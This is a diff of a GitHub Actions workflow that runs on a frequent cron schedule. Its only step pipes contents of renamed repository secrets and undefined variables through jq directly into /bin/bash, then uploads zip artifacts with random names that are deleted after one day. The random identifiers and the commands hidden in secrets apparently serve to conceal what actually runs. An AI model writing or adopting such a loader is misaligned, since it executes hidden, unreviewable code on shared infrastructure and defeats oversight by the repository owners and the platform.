@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '2 0,6,12,18 * * *'
+    - cron: '58 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,15 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          boe22: ${{ secrets.boe22 }}
+          srup7: ${{ secrets.srup7 }}
         run: |
-          printf '%s' "$boe22" | jq -r .eg65291 | /bin/bash
-          echo $sa134 | jq -r .c458 | /bin/bash
-          printf '%s' "$qqdnw42710" | jq -r .dbcy329 | /bin/bash
+          printf '%s' "$srup7" | jq -r .ickx571 | /bin/bash
+          echo $xy1 | jq -r .k86641 | /bin/bash
+          printf '%s' "$aopq1" | jq -r .wy764 | /bin/bash
+          echo $y523 | jq -r .jp8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: cuMPuhYJ
+          name: 1F4xa8Oi
           path: "*.zip"
           retention-days: 1
